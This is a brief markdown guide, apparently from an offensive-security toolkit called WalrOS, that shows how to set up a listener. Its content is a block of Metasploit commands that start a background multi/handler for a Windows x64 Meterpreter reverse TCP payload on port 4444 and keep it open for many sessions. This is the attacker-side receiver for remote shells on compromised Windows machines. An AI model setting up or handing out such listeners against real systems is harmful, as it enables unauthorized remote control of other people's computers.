\# Setting Up Listeners - WalrOS



\## 🎯 Metasploit (Meterpreter) - Recomended



\### Listener básico

```bash

msfconsole -q

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse\_tcp

set LHOST 0.0.0.0

set LPORT 4444

set ExitOnSession false

exploit -j

